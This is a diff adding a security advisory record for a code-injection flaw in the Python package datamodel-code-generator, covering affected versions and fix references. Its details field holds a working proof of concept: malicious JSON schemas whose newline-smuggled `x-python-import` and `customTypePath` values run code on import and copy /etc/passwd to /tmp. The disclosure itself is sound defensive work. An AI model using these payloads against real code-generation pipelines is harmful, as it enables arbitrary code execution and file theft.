@@ -1,0 +1,180 @@
+{
+  "id": "GHSA-5578-w22f-pfx9",
+  "modified": "2026-07-28T21:46:37.206147838Z",
+  "published": "2026-07-28T21:40:20Z",
+  "aliases": [
+    "CVE-2026-55415"
+  ],
+  "summary": "datamodel-code-generator vulnerable to code injection via `x-python-import` / `customTypePath` in generated import statements",
+  "details": "#### Summary\n\nA malicious input schema (OpenAPI / JSON Schema) can execute arbitrary Python code on the machine that **imports** the generated model. The `x-python-import` and `customTypePath` schema extensions flow, unsanitized, into the `import` statements datamodel-code-generator emits. A newline embedded in the extension value breaks out of the `from … import …` line and injects an attacker-controlled statement at module scope, which runs at import time. This is an unauthenticated, schema-content–driven remote code execution against any consumer of the generated code (e.g. arbitrary file read,the PoC exfiltrates `/etc/passwd`). It survives the v0.61.0 security release that fixed the related `x-python-type`, `default_factory`, GraphQL-union-description, and `validators` sinks  those fixes did not cover this sibling path.\n\n#### Details\n\nThe sink is `Import.from_full_path` and `Imports.create_line`:\n\n- `src/datamodel_code_generator/imports.py:35` — `from_full_path()` only does `class_path.split(\".\")` and preserves every other character, **including newlines**:\n  ```python\n  @classmethod\n  @lru_cache\n  def from_full_path(cls, class_path: str) -\u003e Import:\n      split_class_path: list[str] = class_path.split(\".\")\n      return cls(import_=split_class_path[-1], from_=\".\".join(split_class_path[:-1]) or None)\n  ```\n- `src/datamodel_code_generator/imports.py:64` — `create_line()` renders the result verbatim:\n  ```python\n  def create_line(self, from_: str | None, imports: set[str]) -\u003e str:\n      if from_:\n          return f\"from {from_} import {', '.join(self._set_alias(from_, imports))}\"\n      return \"\\n\".join(f\"import {i}\" for i in self._set_alias(from_, imports))\n  ```\n\nThere is no check that the path segments are Python identifiers, contrast `validators._validate_dotted_python_identifier_path`, which the same v0.61.0 release added for the `validators` config, and `types.is_python_type_annotation`, added for `x-python-type`. The two extensions below were left unguarded.\n\nTwo schema-controlled, **default-config** entry points reach this sink:\n\n1. **`x-python-import`** — `src/datamodel_code_generator/parser/jsonschema.py:1851-1858` (`get_ref_data_type`):\n   ```python\n   x_python_import = ref_schema.extras.get(\"x-python-import\")\n   if isinstance(x_python_import, dict):\n       module = x_python_import.get(\"module\")\n       type_name = x_python_import.get(\"name\")\n       if module and type_name:\n           full_path = f\"{module}.{type_name}\"\n           import_ = Import.from_full_path(full_path)\n           self.imports.append(import_)\n   ```\n2. **`customTypePath`** — declared at `src/datamodel_code_generator/parser/jsonschema.py:438`, consumed at `:4118` and `:4365` via `get_data_type_from_full_path(custom_type_path, is_custom_type=True)` → the same `Import.from_full_path` sink.\n\n**Mechanism.** With `name = \"getcwd\\nprint(...)\"`, `full_path = \"os.getcwd\\nprint(...)\"`. `from_full_path` splits only on `.`, so (provided the injected statement contains no `.`) it yields `from_=\"os\"` and `import_=\"getcwd\\nprint(...)\"`. `create_line` then emits:\n```python\nfrom os import getcwd\nprint(...)        # ← attacker statement at module scope, executes on import\n```\nThe dot-split is the only constraint on the payload; it is trivially satisfied with attribute-free builtins (e.g. `print(*open('/etc/passwd'), file=open('/tmp/loot','w'), sep='', end='')` reads and exfiltrates a file using no `.`).\n\nNone of the six v0.61.0 fix commits (`aec47bc4`, `b73abb5c`, `17fc235e`, `2c93c9b7`, `a43d0290`, `5fdba4a0`) touched `x-python-import`, `customTypePath`, or `imports.py`; `imports.py` was last modified ~5 months before the release. This is therefore an **incomplete fix**: the maintainer hardened sibling schema-controlled type/extension sinks but missed these two paths into the same import-generation code.\n\n#### PoC\nSelf contained POC available here: https://gist.github.com/thegr1ffyn/c3abb41bb89c164daa0d5f2c60b5328b\n\nDefault invocation, no special flags, on the patched release (commit `227ffe85ee2dcfc79336fbb14ad64c02a166b65a`, v0.61.0).\n\n`payload_a.json`:\n```json\n{\n  \"type\": \"object\",\n  \"title\": \"Root\",\n  \"required\": [\"f\"],\n  \"properties\": { \"f\": { \"$ref\": \"#/$defs/Evil\" } },\n  \"$defs\": {\n    \"Evil\": {\n      \"type\": \"object\",\n      \"x-python-import\": {\n        \"module\": \"os\",\n        \"name\": \"getcwd\\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_xpi_loot','w'),sep='',end='')\"\n      }\n    }\n  }\n}\n```\nGenerate and import:\n```bash\ndatamodel-codegen --input payload_a.json --input-file-type jsonschema --output model.py\npython -c \"import model\"\n```\nGenerated `model.py` (verbatim, the breakout sits at module scope):\n```python\nfrom __future__ import annotations\n\nfrom os import getcwd\n\nprint(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')\nfrom os import getcwd\n\nprint(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')\nfrom pydantic import BaseModel\n...\n```\nImporting `model` reads `/etc/passwd` and writes an exact copy to `/tmp/dmcg_xpi_loot`:\n```\n$ head -1 /tmp/dmcg_xpi_loot\nroot:x:0:0:root:/root:/bin/bash\n```\nConfirmed under both the default output (pydantic v1) and `--output-model-type pydantic_v2.BaseModel`. The `customTypePath` variant reproduces identically:\n```json\n{ \"type\":\"object\",\"title\":\"Root\",\"required\":[\"f\"],\n  \"properties\":{ \"f\":{ \"type\":\"object\",\n    \"customTypePath\":\"os.getcwd\\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_ctp_loot','w'),sep='',end='')\" }}}\n```\nA benign control (`x-python-import: {\"module\":\"decimal\",\"name\":\"Decimal\"}`) produces clean `from decimal import Decimal` and no execution. A complete self-contained validation harness, `run.sh` plus `control.json`, `payload_a.json`, `payload_b.json`, is included alongside this advisory (CONTROL clean + three payloads firing + verdict + cleanup).\n\n**Suggested fix.** Validate every dotted segment of `module`, `name`, and `customTypePath` as a Python identifier before building the import (reuse `validators._validate_dotted_python_identifier_path`), and/or reject non-identifier paths centrally inside `Import.from_full_path`.\n\n#### Impact\n\nArbitrary code execution at model-import time, driven by attacker-controlled schema content under the default configuration. Anyone who runs datamodel-code-generator on an untrusted or third-party schema, multi-tenant code-generation services, CI pipelines that ingest external specs, or a developer generating models from a public/vendor OpenAPI/JSON-Schema document, and then imports (or whose tooling imports) the generated module, executes the attacker's code with the importing process's privileges. The PoC demonstrates arbitrary local file read (`/etc/passwd`); the same primitive yields full RCE.\n\n### Maintainer status\n\nConfirmed by maintainer review and regression tests. A private fix PR is open and should be merged before publishing this advisory: https://github.com/koxudaxi/datamodel-code-generator-ghsa-5578-w22f-pfx9/pull/1\n\nFix summary: validate `x-python-import` and `customTypePath` values as dotted Python identifier paths before using them in generated imports or type paths.\n\nRelease status: not fixed in `0.63.0`; `customTypePath` was introduced in `0.11.6`, so affected versions are `\u003e= 0.11.6, \u003c= 0.63.0`. This advisory should remain unpublished until the private PR is merged and a patched release is available.\n\nValidation: `uv run --group test --extra http pytest tests/main/jsonschema/test_main_jsonschema.py tests/parser/test_jsonschema.py` passed locally; `uv run --group fix ruff check src/datamodel_code_generator/parser/jsonschema.py tests/main/jsonschema/test_main_jsonschema.py` passed.\n\nSubmitted by: Hamza Haroon (thegr1ffyn)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "datamodel-code-generator",
+        "purl": "pkg:pypi/datamodel-code-generator"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.11.6"
+            },
+            {
+              "fixed": "0.64.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.11.10",
+        "0.11.11",
+        "0.11.12",
+        "0.11.13",
+        "0.11.14",
+        "0.11.15",
+        "0.11.16",
+        "0.11.17",
+        "0.11.18",
+        "0.11.19",
+        "0.11.20",
+        "0.11.6",
+        "0.11.7",
+        "0.11.8",
+        "0.11.9",
+        "0.12.0",
+        "0.12.1",
+        "0.12.2",
+        "0.12.3",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.14.0",
+        "0.14.1",
+        "0.15.0",
+        "0.16.0",
+        "0.16.1",
+        "0.17.0",
+        "0.17.1",
+        "0.17.2",
+        "0.18.0",
+        "0.18.1",
+        "0.19.0",
+        "0.20.0",
+        "0.21.0",
+        "0.21.1",
+        "0.21.2",
+        "0.21.3",
+        "0.21.4",
+        "0.21.5",
+        "0.22.0",
+        "0.22.1",
+        "0.23.0",
+        "0.24.0",
+        "0.24.1",
+        "0.24.2",
+        "0.25.0",
+        "0.25.1",
+        "0.25.2",
+        "0.25.3",
+        "0.25.4",
+        "0.25.5",
+        "0.25.6",
+        "0.25.7",
+        "0.25.8",
+        "0.25.9",
+        "0.26.0",
+        "0.26.1",
+        "0.26.2",
+        "0.26.3",
+        "0.26.4",
+        "0.26.5",
+        "0.27.0",
+        "0.27.1",
+        "0.27.2",
+        "0.27.3",
+        "0.28.0",
+        "0.28.1",
+        "0.28.2",
+        "0.28.3",
+        "0.28.4",
+        "0.28.5",
+        "0.29.0",
+        "0.30.0",
+        "0.30.1",
+        "0.30.2",
+        "0.31.0",
+        "0.31.1",
+        "0.31.2",
+        "0.32.0",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.38.0",
+        "0.39.0",
+        "0.40.0",
+        "0.41.0",
+        "0.42.0",
+        "0.42.1",
+        "0.42.2",
+        "0.43.0",
+        "0.43.1",
+        "0.44.0",
+        "0.45.0",
+        "0.46.0",
+        "0.47.0",
+        "0.48.0",
+        "0.49.0",
+        "0.50.0",
+        "0.51.0",
+        "0.52.0",
+        "0.52.1",
+        "0.52.2",
+        "0.53.0",
+        "0.54.0",
+        "0.54.1",
+        "0.55.0",
+        "0.56.0",
+        "0.56.1",
+        "0.57.0",
+        "0.58.0",
+        "0.59.0",
+        "0.59.1",
+        "0.60.0",
+        "0.60.1",
+        "0.60.2",
+        "0.61.0",
+        "0.62.0",
+        "0.63.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.63.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-5578-w22f-pfx9/GHSA-5578-w22f-pfx9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koxudaxi/datamodel-code-generator/commit/577d49569c2254c371a97e495020ae2238a73b84"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/koxudaxi/datamodel-code-generator"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.64.0"
+    }
+  ]
+}
